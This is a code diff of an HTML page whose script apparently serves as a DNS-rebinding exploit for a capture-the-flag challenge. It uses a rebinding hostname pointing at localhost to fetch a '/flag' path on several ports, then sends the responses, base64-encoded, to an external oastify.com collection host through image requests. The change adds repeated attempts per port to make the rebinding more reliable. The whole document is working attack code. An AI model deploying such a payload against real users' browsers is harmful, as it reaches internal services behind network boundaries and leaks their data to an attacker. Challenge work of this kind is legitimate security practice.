@@ -3,21 +3,23 @@
 <body>
 <script>
 const target = 'acd918ee.7f000001.rbndr.us';
-const ports = [80, 8080, 3000, 5000, 8000, 8081, 8443, 9000, 3001, 4000];
+const ports = [80, 8080, 3000, 5000, 8000, 8081, 8443, 9000];
 
-ports.forEach((port, i) => {
-    setTimeout(() => {
-        fetch(`http://${target}:${port}/flag`)
-            .then(r => r.text())
-            .then(flag => {
-                const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?success_${port}=` + btoa(flag);
-            })
-            .catch(err => {
-                const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${port}=` + btoa(err.toString());
-            });
-    }, i * 1000);
+ports.forEach(port => {
+    for (let i = 1; i <= 10; i++) {
+        setTimeout(() => {
+            fetch(`http://${target}:${port}/flag`)
+                .then(r => r.text())
+                .then(flag => {
+                    const img = new Image();
+                    img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?success_${port}_${i}=` + btoa(flag);
+                })
+                .catch(err => {
+                    const img = new Image();
+                    img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${port}_${i}=` + btoa(err.toString());
+                });
+        }, (ports.indexOf(port) * 1000) + (i * 200));
+    }
 });
 </script>
 </body>
